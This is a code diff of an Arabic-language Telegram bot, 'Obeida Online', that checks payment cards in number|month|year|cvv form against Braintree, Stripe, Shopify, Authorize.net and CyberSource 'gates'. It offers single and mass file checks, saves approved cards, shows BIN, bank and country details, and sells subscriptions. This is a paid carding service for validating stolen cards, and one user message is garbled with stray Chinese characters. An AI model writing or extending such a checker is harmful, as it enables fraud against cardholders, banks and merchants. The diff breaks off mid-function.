+            'shopify': self.shopify_gate, 'authorize': self.authorize_gate,
+            'cybersource': self.cybersource_gate
         }
-        
-        if gate_name not in gate_methods:
-            return False, "❌ بوابة غير مدعومة"
-        
-        try:
-            # تنفيذ الفحص في thread منفصل
-            loop = asyncio.get_event_loop()
-            result = await loop.run_in_executor(
-                None, 
-                gate_methods[gate_name], 
-                card_data
-            )
-            return result
-        except Exception as e:
-            return False, f"⚠️ خطأ في الفحص: {str(e)[:50]}"
+        if gate not in gates: return False, "❌ بوابة غير مدعومة"
+        return await gates[gate](card)
 
 # ==================== واجهة المستخدم ====================
 class UserInterface:
-    """واجهة المستخدم للبوت"""
-    
     @staticmethod
     def main_menu():
-        """القائمة الرئيسية"""
         markup = InlineKeyboardMarkup(row_width=2)
-        
-        buttons = [
+        btns = [
             InlineKeyboardButton("🔷 Braintree", callback_data="gate_braintree"),
-            InlineKeyboardButton("🔄 SwitchUp", callback_data="gate_switchup"),
             InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
-            InlineKeyboardButton("📦 Zendrop", callback_data="gate_zendrop"),
-            InlineKeyboardButton("💰 PayPal", callback_data="gate_paypal"),
+            InlineKeyboardButton("🛍️ Shopify", callback_data="gate_shopify"),
+            InlineKeyboardButton("🔐 Authorize.net", callback_data="gate_authorize"),
+            InlineKeyboardButton("🌐 CyberSource", callback_data="gate_cybersource"),
             InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
             InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
-            InlineKeyboardButton("📊 إحصائياتي", callback_data="my_stats"),
-            InlineKeyboardButton("📊 إحصائيات البوت", callback_data="global_stats"),
+            InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
             InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
             InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
             InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
         ]
-        
-        # إضافة أزرار إضافية للصف الثالث
-        row1 = buttons[:3]
-        row2 = buttons[3:6]
-        row3 = buttons[6:9]
-        row4 = buttons[9:11]
-        row5 = buttons[11:13]
-        
-        markup.row(*row1)
-        markup.row(*row2)
-        markup.row(*row3)
-        markup.row(*row4)
-        markup.row(*row5)
-        
+        markup.add(*btns)
         return markup
     
     @staticmethod
-    def gates_menu():
-        """قائمة البوابات"""
-        markup = InlineKeyboardMarkup(row_width=2)
-        
-        for gate_id, gate_info in GATES.items():
-            if gate_info.get("enabled", True):
-                markup.add(InlineKeyboardButton(
-                    f"{gate_info['icon']} {gate_info['name']}", 
-                    callback_data=f"select_gate_{gate_id}"
-                ))
-        
-        markup.add(
-            InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_main"),
-            InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check")
-        )
-        return markup
-    
-    @staticmethod
-    def subscription_plans():
-        """خطط الاشتراك"""
-        markup = InlineKeyboardMarkup(row_width=2)
-        
-        for plan_id, plan in SUBSCRIPTION_PLANS.items():
-            markup.add(InlineKeyboardButton(
-                f"📅 {plan['name']} - {plan['price']}",
-                callback_data=f"sub_{plan_id}"
-            ))
-        
-        markup.add(
-            InlineKeyboardButton("🔙 رجوع", callback_data="back_main"),
-            InlineKeyboardButton("📞 تواصل مع المطور", url=SUPPORT_LINK)
-        )
-        return markup
-    
-    @staticmethod
-    def admin_menu():
-        """قائمة المشرفين"""
-        markup = InlineKeyboardMarkup(row_width=2)
-        
-        buttons = [
-            InlineKeyboardButton("👥 المستخدمين", callback_data="admin_users"),
-            InlineKeyboardButton("➕ إضافة اشتراك", callback_data="admin_add_sub"),
-            InlineKeyboardButton("➖ إزالة اشتراك", callback_data="admin_remove_sub"),
-            InlineKeyboardButton("📊 إحصائيات عامة", callback_data="admin_stats"),
-            InlineKeyboardButton("📢 إشعار", callback_data="admin_broadcast"),
-            InlineKeyboardButton("⚙️ إعدادات", callback_data="admin_settings"),
-            InlineKeyboardButton("📁 عرض المقبولة", callback_data="admin_approved"),
-            InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
-        ]
-        
-        row1 = buttons[:2]
-        row2 = buttons[2:4]
-        row3 = buttons[4:6]
-        row4 = buttons[6:8]
-        
-        markup.row(*row1)
-        markup.row(*row2)
-        markup.row(*row3)
-        markup.row(*row4)
-        
-        return markup
-    
-    @staticmethod
-    def back_button(callback: str = "back_main", text: str = "🔙 رجوع"):
-        """زر الرجوع"""
+    def back_button(callback="back_main"):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton(text, callback_data=callback))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
         return markup
     
     @staticmethod
     def stop_button(check_id: int):
-        """زر إيقاف الفحص"""
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_check_{check_id}"))
+        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
         return markup
     
     @staticmethod
-    def format_card_result(card: str, result: str, gate: str, is_approved: bool) -> str:
-        """تنسيق نتيجة الفحص"""
-        status_icon = "✅" if is_approved else "❌"
-        
-        # استخراج معلومات البطاقة
-        parts = card.split('|')
-        number = parts[0] if parts else "Unknown"
+    def format_result(card: str, result: str, gate: str, is_approved: bool) -> str:
+        status = "✅" if is_approved else "❌"
+        number = card.split('|')[0] if '|' in card else card
+        masked = f"{number[:6]}xxxxxx{number[-4:]}"
         brand = Helpers.get_card_brand(number)
         bin_info = Helpers.get_bin_info(number[:6])
-        
-        masked = f"{number[:6]}xxxxxx{number[-4:]}" if len(number) >= 16 else number
-        
-        result_text = f"""
-{status_icon} <b>نتيجة الفحص</b> {status_icon}
-━━━━━━━━━━━━━━━━
+        return f"""
+{status} <b>نتيجة الفحص</b>
+━━━━━━━━━━━━
 <b>💳 البطاقة:</b> <code>{masked}</code>
 <b>🏷️ النوع:</b> {brand} | {bin_info['brand']}
 <b>🏦 البنك:</b> {bin_info['bank']}
 <b>🌍 الدولة:</b> {bin_info['country']} {bin_info['flag']}
 <b>🚪 البوابة:</b> {gate}
 <b>📊 الحالة:</b> {result}
-━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━
 <b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
 """
-        return result_text
-    
-    @staticmethod
-    def format_profile(user_data: Dict, user_id: int) -> str:
-        """تنسيق بيانات الملف الشخصي"""
-        usage = user_data.get("usage", {})
-        sub = user_data.get("subscription", {})
-        
-        expiry = "غير محدود"
-        if sub.get("expiry"):
-            try:
-                expiry_date = datetime.fromisoformat(sub["expiry"])
-                if expiry_date > datetime.now():
-                    remaining = expiry_date - datetime.now()
-                    days = remaining.days
-                    hours = remaining.seconds // 3600
-                    expiry = f"{days} يوم {hours} ساعة"
-                else:
-                    expiry = "منتهي"
-            except:
-                expiry = "غير معروف"
-        
-        # حساب النسب المئوية
-        total = usage.get('total_checks', 0)
-        approved = usage.get('approved', 0)
-        declined = usage.get('declined', 0)
-        
-        if total > 0:
-            approved_percent = (approved / total) * 100
-            declined_percent = (declined / total) * 100
-        else:
-            approved_percent = 0
-            declined_percent = 0
-        
-        profile_text = f"""
-👤 <b>الملف الشخصي</b>
-━━━━━━━━━━━━━━━━
-<b>🆔 المعرف:</b> <code>{user_id}</code>
-<b>👤 الاسم:</b> {user_data.get('first_name', 'Unknown')}
-<b>⭐ الرتبة:</b> {'👑 مشرف' if user_data.get('is_admin') else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
-<b>📅 تاريخ الانضمام:</b> {user_data.get('joined_date', 'Unknown')[:10]}
-
-<b>📊 إحصائيات الاستخدام</b>
-━━━━━━━━━━━━━━━━
-<b>🔄 إجمالي الفحوصات:</b> {total}
-<b>✅ المقبولة:</b> {approved} ({approved_percent:.1f}%)
-<b>❌ المرفوضة:</b> {declined} ({declined_percent:.1f}%)
-<b>📅 آخر فحص:</b> {usage.get('last_check', 'لم يتم')[:16] if usage.get('last_check') else 'لم يتم'}
-
-<b>📊 شريط النجاح:</b>
-{Helpers.generate_progress_bar(approved, total if total > 0 else 1, 15)}
-
-<b>💎 الاشتراك</b>
-━━━━━━━━━━━━━━━━
-<b>📦 الخطة:</b> {sub.get('plan', 'لا يوجد')}
-<b>⏳ المتبقي:</b> {expiry}
-━━━━━━━━━━━━━━━━
-<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
-"""
-        return profile_text
-    
-    @staticmethod
-    def format_stats(stats: Dict) -> str:
-        """تنسيق الإحصائيات العامة"""
-        today = datetime.now().strftime("%Y-%m-%d")
-        daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
-        
-        # ترتيب البوابات حسب الاستخدام
-        gates_usage = stats.get("gates_usage", {})
-        top_gates = sorted(gates_usage.items(), key=lambda x: x[1], reverse=True)[:5]
-        
-        gates_text = ""
-        for gate, count in top_gates:
-            gate_name = GATES.get(gate, {}).get("name", gate)
-            icon = GATES.get(gate, {}).get("icon", "🚪")
-            gates_text += f"  {icon} {gate_name}: {count} فحص\n"
-        
-        total = stats.get('total_checks', 0)
-        approved = stats.get('total_approved', 0)
-        declined = stats.get('total_declined', 0)
-        
-        if total > 0:
-            approved_percent = (approved / total) * 100
-        else:
-            approved_percent = 0
-        
-        stats_text = f"""
-📊 <b>إحصائيات البوت العامة</b>
-━━━━━━━━━━━━━━━━
-<b>📅 اليوم ({today})</b>
-  • إجمالي الفحوصات: {daily['checks']}
-  • البطاقات المقبولة: {daily['approved']}
-  {Helpers.generate_progress_bar(daily['approved'], daily['checks'] if daily['checks'] > 0 else 1, 10)}
-
-<b>📈 الإجمالي العام</b>
-  • إجمالي الفحوصات: {total}
-  • البطاقات المقبولة: {approved} ({approved_percent:.1f}%)
-  • البطاقات المرفوضة: {declined}
-
-<b>🚪 أكثر البوابات استخداماً</b>
-{gates_text if gates_text else '  • لا توجد بيانات'}
-
-<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
-"""
-        return stats_text
 
 # ==================== معالج الأوامر ====================
 class CommandHandler:
-    """معالج أوامر البوت"""
-    
     def __init__(self):
-        self.gateways = Gateways()
+        self.gateways = RealGateways()
         self.ui = UserInterface()
         self.active_checks = active_checks
-        self.user_sessions = user_sessions
         self.live_stats = live_stats
-        
-    def check_subscription(self, message) -> bool:
-        """التحقق من صلاحية الاشتراك"""
-        user_id = message.from_user.id
-        if user_id in ADMIN_IDS:
-            return True
-        
-        sub = DataManager.get_user_subscription(user_id)
-        if sub is None:
-            markup = InlineKeyboardMarkup()
-            markup.add(
-                InlineKeyboardButton("💎 خطط الاشتراك", callback_data="subscribe"),
-                InlineKeyboardButton("📞 تواصل مع المطور", url=SUPPORT_LINK)
-            )
-            bot.reply_to(
-                message,
-                f"⚠️ <b>عذراً، ليس لديك اشتراك نشط</b>\n\n"
-                f"للاستمرار في استخدام البوت، يرجى الاشتراك من خلال:\n"
-                f"• القناة: {CHANNEL_USERNAME}\n"
-                f"• المطور: {DEV_CONTACT}\n\n"
-                f"أو استخدم الأمر /subscribe لعرض خطط الاشتراك",
-                parse_mode='HTML',
-                reply_markup=markup
-            )
-            return False
-        return True
+    
+    def check_sub(self, message) -> bool:
+        if message.from_user.id in ADMIN_IDS: return True
+        if DataManager.get_user_subscription(message.from_user.id): return True
+        bot.reply_to(message, "⚠️你不是اشتراك نشط\nللاشتراك: /subscribe", reply_markup=self.ui.back_button())
+        return False
     
     def handle_start(self, message):
-        """معالج أمر /start"""
         user = message.from_user
-        user_id = user.id
-        
-        # تسجيل المستخدم
         users = DataManager.load_users()
-        if str(user_id) not in users:
-            users[str(user_id)] = {
-                "user_id": user_id,
-                "username": user.username,
-                "first_name": user.first_name,
-                "last_name": user.last_name,
-                "joined_date": datetime.now().isoformat(),
-                "is_admin": user_id in ADMIN_IDS,
-                "is_subscribed": user_id in ADMIN_IDS,
-                "subscription": {"active": user_id in ADMIN_IDS, "plan": "lifetime"} if user_id in ADMIN_IDS else {},
-                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
-            }
+        if str(user.id) not in users:
+            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name,
+                                  "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS,
+                                  "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
             DataManager.save_users(users)
         
-        # إنشاء جلسة للمستخدم
-        self.user_sessions[user_id] = {
-            "last_activity": time.time(),
-            "current_check": None,
-            "stats_message": None
-        }
-        
-        welcome_text = f"""
+        welcome = f"""
 ✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
 
-<b>🚪 البوابات المدعومة:</b>
-🔷 Braintree Auth
-🔄 SwitchUp Auth
-💳 Stripe Auth
-📦 Zendrop Auth
-💰 PayPal Auth
+<b>🚪 البوابات الحقيقية:</b>
+🔷 Braintree | 💳 Stripe | 🛍️ Shopify
+🔐 Authorize.net | 🌐 CyberSource
 
-<b>📝 الأوامر المتاحة:</b>
-/start - عرض القائمة الرئيسية
-/gates - عرض جميع البوابات
-/mass - فحص ملف بطاقات
-/profile - عرض ملفك الشخصي
-/stats - إحصائيات البوت
-/subscribe - خطط الاشتراك
-/help - مساعدة
+<b>📝 الأوامر:</b>
+/start - القائمة الرئيسية
+/gates - البوابات
+/mass - فحص ملف
+/profile - حسابي
+/stats - الإحصائيات
+/subscribe - الاشتراك
 
 <b>📢 القناة:</b> {CHANNEL_USERNAME}
 <b>👨‍💻 المطور:</b> {DEV_CONTACT}
-
-<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
 """
-        
-        bot.send_message(
-            user_id,
-            welcome_text,
-            parse_mode='HTML',
-            reply_markup=self.ui.main_menu()
-        )
+        bot.send_message(user.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_menu())
     
     def handle_help(self, message):
-        """معالج أمر /help"""
-        help_text = f"""
-📚 <b>مساعدة البوت - Obeida Online</b>
-
-<b>📝 الأوامر الأساسية:</b>
-/start - عرض القائمة الرئيسية
-/gates - عرض جميع البوابات
-/mass - فحص ملف بطاقات
-/profile - عرض ملفك الشخصي
-/stats - إحصائيات البوت
-/subscribe - خطط الاشتراك
-/help - عرض هذه المساعدة
-
-<b>🚪 البوابات المدعومة:</b>
-/braintree [البطاقة] - فحص عبر Braintree
-/switchup [البطاقة] - فحص عبر SwitchUp
-/stripe [البطاقة] - فحص عبر Stripe
-/zendrop [البطاقة] - فحص عبر Zendrop
-/paypal [البطاقة] - فحص عبر PayPal
-
-<b>📌 صيغة البطاقة:</b>
-<code>رقم|شهر|سنة|cvv</code>
-مثال: <code>4111111111111111|12|25|123</code>
-
-<b>📁 فحص ملف:</b>
-أرسل ملف txt يحتوي على بطاقات (واحدة في كل سطر)
-
-<b>💎 الاشتراك:</b>
-/subscribe - لعرض خطط الاشتراك
-للاستفسار: {DEV_CONTACT}
-
-<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
-"""
-        bot.reply_to(message, help_text, parse_mode='HTML')
+        bot.reply_to(message, "📚 استخدم /start للقائمة الرئيسية", parse_mode='HTML')
     
     def handle_profile(self, message):
-        """معالج أمر /profile"""
         user_id = message.from_user.id
         users = DataManager.load_users()
-        user_data = users.get(str(user_id), {})
-        
-        profile_text = self.ui.format_profile(user_data, user_id)
-        bot.reply_to(
-            message,
-            profile_text,
-            parse_mode='HTML',
-            reply_markup=self.ui.back_button()
-        )
+        data = users.get(str(user_id), {})
+        usage = data.get('usage', {})
+        sub = data.get('subscription', {})
+        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
+        total, approved, declined = usage.get('total_checks',0), usage.get('approved',0), usage.get('declined',0)
+        profile = f"""
+👤 <b>الملف الشخصي</b>
+━━━━━━━━━━━━
+<b>🆔 المعرف:</b> <code>{user_id}</code>
+<b>👤 الاسم:</b> {data.get('first_name','Unknown')}
+<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub else '🔹 عادي'}
+<b>📅 الانضمام:</b> {data.get('joined_date','Unknown')[:10]}
+
+<b>📊 الإحصائيات:</b>
+• إجمالي: {total}
+• ✅ المقبولة: {approved}
+• ❌ المرفوضة: {declined}
+
+<b>💎 الاشتراك:</b> {sub.get('plan','لا يوجد')} | ينتهي: {expiry}
+━━━━━━━━━━━━
+<b>🆔 Obeida Online</b>
+"""
+        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
     
     def handle_stats(self, message):
-        """معالج أمر /stats"""
         stats = DataManager.load_stats()
-        stats_text = self.ui.format_stats(stats)
-        bot.reply_to(
-            message,
-            stats_text,
-            parse_mode='HTML',
-            reply_markup=self.ui.back_button()
-        )
-    
-    def handle_my_stats(self, call):
-        """معالج إحصائيات المستخدم"""
-        user_id = call.from_user.id
-        users = DataManager.load_users()
-        user_data = users.get(str(user_id), {})
-        
-        profile_text = self.ui.format_profile(user_data, user_id)
-        bot.edit_message_text(
-            profile_text,
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='HTML',
-            reply_markup=self.ui.back_button()
-        )
-    
-    def handle_global_stats(self, call):
-        """معالج إحصائيات البوت"""
-        stats = DataManager.load_stats()
-        stats_text = self.ui.format_stats(stats)
-        bot.edit_message_text(
-            stats_text,
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='HTML',
-            reply_markup=self.ui.back_button()
-        )
+        today = datetime.now().strftime("%Y-%m-%d")
+        daily = stats.get("daily_stats", {}).get(today, {"checks":0, "approved":0})
+        gates = "\n".join([f"  {GATES.get(g,{}).get('icon','🚪')} {g}: {c}" for g,c in stats.get('gates_usage',{}).items()][:5])
+        total, approved = stats.get('total_checks',0), stats.get('total_approved',0)
+        text = f"""
+📊 <b>إحصائيات البوت</b>
+━━━━━━━━━━━━
+📅 اليوم: {daily['checks']} فحص | ✅ {daily['approved']}
+📈 الإجمالي: {total} | ✅ {approved} ({(approved/total*100) if total>0 else 0:.1f}%)
+🚪 أكثر البوابات:
+{gates if gates else '  لا توجد'}
+━━━━━━━━━━━━
+<b>🆔 Obeida Online</b>
+"""
+        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
     
     def handle_subscribe(self, message):
-        """معالج أمر /subscribe"""
-        user_id = message.from_user.id
-        
-        # التحقق من الاشتراك الحالي
-        current_sub = DataManager.get_user_subscription(user_id)
-        
-        if current_sub:
-            sub_text = f"""
-💎 <b>لديك اشتراك نشط</b>
-
-<b>📦 الخطة:</b> {current_sub.get('plan', 'غير معروفة')}
-<b>⏳ تاريخ الانتهاء:</b> {current_sub.get('expiry', 'غير معروف')[:10]}
-
-يمكنك تجديد الاشتراك من خلال التواصل مع المطور:
-{DEV_CONTACT}
-"""
-            bot.reply_to(message, sub_text, parse_mode='HTML')
+        sub = DataManager.get_user_subscription(message.from_user.id)
+        if sub:
+            bot.reply_to(message, f"💎 لديك اشتراك نشط\nينتهي: {sub.get('expiry','')[:10]}", parse_mode='HTML')
         else:
-            plans_text = f"""
-💎 <b>خطط الاشتراك - Obeida Online</b>
-
-<b>📅 الخطط المتاحة:</b>
-• يومي: 5K ID
-• أسبوعي: 15K ID
-• شهري: 40K ID
-• 3 أشهر: 100K ID
-• 6 أشهر: 180K ID
-• سنوي: 300K ID
-
-<b>✅ مميزات الاشتراك:</b>
-✓ فحص غير محدود للبطاقات
-✓ جميع البوابات متاحة
-✓ فحص ملفات كاملة
-✓ عرض مباشر للإحصائيات
-✓ دعم فني متميز
-✓ تحديثات مستمرة
-
-للاشتراك، تواصل مع المطور:
-{DEV_CONTACT}
-
-أو اشترك عبر القناة:
-{CHANNEL_USERNAME}
-"""
-            bot.reply_to(
-                message,
-                plans_text,
-                parse_mode='HTML',
-                reply_markup=self.ui.subscription_plans()
-            )
+            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
+            text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك تواصل: {DEV_CONTACT}"
+            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
     
     def handle_gates(self, message):
-        """معالج أمر /gates"""
-        gates_text = "🚪 <b>البوابات المتاحة:</b>\n\n"
-        
-        for gate_id, gate_info in GATES.items():
-            if gate_info.get("enabled", True):
-                gates_text += f"{gate_info['icon']} {gate_info['name']}\n"
-                gates_text += f"📝 <code>/{gate_info['command']} رقم|شهر|سنة|cvv</code>\n\n"
-        
-        gates_text += f"\n<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>"
-        
-        bot.reply_to(
-            message,
-            gates_text,
-            parse_mode='HTML',
-            reply_markup=self.ui.gates_menu()
-        )
+        gates = "\n".join([f"{g['icon']} {g['name']}\n   <code>/{g['command']} رقم|شهر|سنة|cvv</code>" for g in GATES.values()])
+        bot.reply_to(message, f"🚪 <b>البوابات:</b>\n\n{gates}", parse_mode='HTML', reply_markup=self.ui.back_button())
     
-    def handle_single_check(self, message, gate: str):
-        """معالج فحص بطاقة واحدة"""
-        # التحقق من الاشتراك
-        if not self.check_subscription(message):
-            return
-        
-        # استخراج نص البطاقة
-        text = message.text.strip()
-        parts = text.split(' ', 1)
-        
+    def handle_single(self, message, gate):
+        if not self.check_sub(message): return
+        parts = message.text.strip().split(' ', 1)
         if len(parts) < 2:
-            bot.reply_to(
-                message,
-                f"⚠️ <b>الاستخدام الصحيح:</b>\n"
-                f"<code>/{gate} رقم|شهر|سنة|cvv</code>\n\n"
-                f"مثال: <code>/{gate} 4111111111111111|12|25|123</code>",
-                parse_mode='HTML'
-            )
+            bot.reply_to(message, f"⚠️ الاستخدام: /{gate} رقم|شهر|سنة|cvv\nمثال: /{gate} 4111111111111111|12|25|123")
             return
         
-        card_str = parts[1].strip()
-        card_data = Helpers.parse_card(card_str)
-        
-        if not card_data:
-            bot.reply_to(
-                message,
-                f"❌ <b>صيغة بطاقة غير صحيحة!</b>\n\n"
-                f"الصيغة المطلوبة: <code>رقم|شهر|سنة|cvv</code>\n"
-                f"مثال: <code>4111111111111111|12|25|123</code>",
-                parse_mode='HTML'
-            )
+        card = Helpers.parse_card(parts[1])
+        if not card:
+            bot.reply_to(message, "❌ صيغة غير صحيحة")
             return
         
-        # إرسال رسالة "جاري الفحص"
-        status_msg = bot.reply_to(
-            message,
-            f"🔄 <b>جاري فحص البطاقة عبر {GATES[gate]['name']}...</b>\n"
-            f"⏱️ يرجى الانتظار...",
-            parse_mode='HTML'
-        )
-        
-        # تنفيذ الفحص
+        msg = bot.reply_to(message, f"🔄 جاري الفحص عبر {GATES[gate]['icon']} {GATES[gate]['name']}...")
         try:
-            # فحص Luhn
-            if not Helpers.luhn_check(card_data['number']):
-                result = (False, "⚠️ رقم بطاقة غير صالح (Luhn)")
-            else:
-                # تنفيذ الفحص
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                result = loop.run_until_complete(
-                    self.gateways.check_card(gate, card_data)
-                )
-                loop.close()
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
+            loop.close()
             
-            is_approved, response = result
+            DataManager.update_usage(message.from_user.id, gate, resp)
+            if approved: DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, message.from_user.id)
             
-            # تحديث الإحصائيات
-            DataManager.update_usage(message.from_user.id, gate, response)
-            
-            # حفظ البطاقة المقبولة
-            if is_approved:
-                DataManager.save_approved_card(
-                    card_data['original'],
-                    GATES[gate]['name'],
-                    response,
-                    message.from_user.id
-                )
-            
-            # تنسيق النتيجة
-            result_text = self.ui.format_card_result(
-                card_data['original'],
-                response,
-                GATES[gate]['name'],
-                is_approved
-            )
-            
-            # حذف رسالة "جاري الفحص"
-            bot.delete_message(status_msg.chat.id, status_msg.message_id)
-            
-            # إرسال النتيجة
-            bot.reply_to(message, result_text, parse_mode='HTML')
-            
+            bot.delete_message(msg.chat.id, msg.message_id)
+            bot.reply_to(message, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
         except Exception as e:
-            bot.edit_message_text(
-                f"⚠️ <b>حدث خطأ أثناء الفحص:</b>\n<code>{str(e)[:100]}</code>",
-                status_msg.chat.id,
-                status_msg.message_id,
-                parse_mode='HTML'
-            )
+            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", msg.chat.id, msg.message_id)
     
-    def handle_mass_check(self, message):
-        """معالج فحص ملف"""
-        # التحقق من الاشتراك
-        if not self.check_subscription(message):
-            return
-        
+    def handle_mass(self, message):
+        if not self.check_sub(message): return
         if not message.document:
-            bot.reply_to(
-                message,
-                "📁 <b>يرجى إرسال ملف txt يحتوي على البطاقات</b>\n\n"
-                "الصيغة: بطاقة واحدة في كل سطر\n"
-                "مثال: <code>4111111111111111|12|25|123</code>",
-                parse_mode='HTML'
-            )
+            bot.reply_to(message, "📁 أرسل ملف txt بالبطاقات")
             return
         
         try:
-            # تحميل الملف
-            file_info = bot.get_file(message.document.file_id)
-            downloaded_file = bot.download_file(file_info.file_path)
-            
-            # قراءة البطاقات
-            content = downloaded_file.decode('utf-8')
+            file = bot.get_file(message.document.file_id)
+            content = bot.download_file(file.file_path).decode('utf-8')
             cards = []
-            invalid_cards = []
-            
             for line in content.split('\n'):
-                line = line.strip()
-                if line:
-                    card_data = Helpers.parse_card(line)
-                    if card_data and Helpers.luhn_check(card_data['number']):
-                        cards.append(card_data)
-                    else:
-                        invalid_cards.append(line)
+                if line.strip():
+                    c = Helpers.parse_card(line.strip())
+                    if c and Helpers.luhn_check(c['number']):
+                        cards.append(c)
             
             if not cards:
-                bot.reply_to(
-                    message,
-                    "❌ <b>لم يتم العثور على بطاقات صالحة في الملف!</b>\n\n"
-                    "تأكد من الصيغة: <code>رقم|شهر|سنة|cvv</code>",
-                    parse_mode='HTML'
-                )
+                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                 return
             
-            # اختيار البوابة
             markup = InlineKeyboardMarkup(row_width=2)
-            for gate_id, gate_info in GATES.items():
-                if gate_info.get("enabled", True):
-                    markup.add(InlineKeyboardButton(
-                        f"{gate_info['icon']} {gate_info['name']}",
-                        callback_data=f"mass_{gate_id}_{message.message_id}"
-                    ))
-            
+            for gid, g in GATES.items():
+                if g.get('enabled'):
+                    markup.add(InlineKeyboardButton(f"{g['icon']} {g['name']}", callback_data=f"mass_{gid}_{message.message_id}"))
             markup.add(InlineKeyboardButton("🔙 إلغاء", callback_data="back_main"))
             
-            # تخزين البطاقات مؤقتاً
             self.active_checks[message.message_id] = {
-                'cards': cards,
-                'user_id': message.from_user.id,
-                'chat_id': message.chat.id,
-                'message_id': message.message_id,
-                'gate': None,
-                'status_msg': None,
-                'results': {'approved': [], 'declined': [], 'errors': []},
-                'current_index': 0,
-                'is_running': False,
-                'stop_flag': False
+                'cards': cards, 'user_id': message.from_user.id, 'chat_id': message.chat.id, 'message_id': message.message_id
             }
+            self.live_stats[message.from_user.id] = {'total': len(cards), 'checked': 0, 'approved': 0, 'declined': 0}
             
-            # تهيئة الإحصائيات المباشرة للمستخدم
-            self.live_stats[message.from_user.id] = {
-                'total': len(cards),
-                'checked': 0,
-                'approved': 0,
-                'declined': 0,
-                'current': None
-            }
-            
-            bot.reply_to(
-                message,
-                f"📁 <b>تم تحميل الملف بنجاح</b>\n\n"
-                f"✅ بطاقات صالحة: {len(cards)}\n"
-                f"❌ بطاقات غير صالحة: {len(invalid_cards)}\n\n"
-                f"🚪 <b>اختر البوابة للفحص:</b>",
-                parse_mode='HTML',
-                reply_markup=markup
-            )
-            
+            bot.reply_to(message, f"📁 {len(cards)} بطاقة صالحة\nاختر البوابة:", reply_markup=markup)
         except Exception as e:
-            bot.reply_to(
-                message,
-                f"⚠️ <b>خطأ في قراءة الملف:</b>\n<code>{str(e)[:100]}</code>",
-                parse_mode='HTML'
-            )
+            bot.reply_to(message, f"⚠️ {str(e)[:50]}")
     
-    async def process_mass_check(self, call, gate: str, check_id: int):
-        """معالجة الفحص الجماعي مع عرض مباشر"""
-        check_data = self.active_checks.get(check_id)
-        if not check_data:
-            await bot.answer_callback_query(call.id, "❌ انتهت صلاحية الطلب")
-            return
+    async def process_mass(self, call, gate, check_id):
+        data = self.active_checks.get(check_id)
+        if not data: return await bot.answer_callback_query(call.id, "❌ انتهت")
         
-        # تحديث بيانات الفحص
-        check_data['gate'] = gate
-        check_data['is_running'] = True
-        check_data['stop_flag'] = False
+        data['gate'] = gate
+        cards = data['cards']
+        uid, cid = data['user_id'], data['chat_id']
         
-        cards = check_data['cards']
-        user_id = check_data['user_id']
-        chat_id = check_data['chat_id']
+        stats = self.live_stats[uid]
+        stats_msg = await bot.send_message(cid, f"🔄 بدء الفحص عبر {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards),0,0,0)}", 
+                                          parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
         
-        # تحديث إحصائيات المستخدم
-        self.live_stats[user_id] = {
-            'total': len(cards),
-            'checked': 0,
-            'approved': 0,
-            'declined': 0,
-            'current': None
-        }
-        
-        # إرسال رسالة بدء الفحص مع الإحصائيات المباشرة
-        initial_stats = Helpers.format_live_stats(
-            len(cards), 0, 0, 0, "جارٍ التجهيز..."
-        )
-        
-        status_msg = await bot.send_message(
-            chat_id,
-            f"🔄 <b>بدأ الفحص الجماعي</b>\n"
-            f"🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n"
-            f"{initial_stats}",
-            parse_mode='HTML',
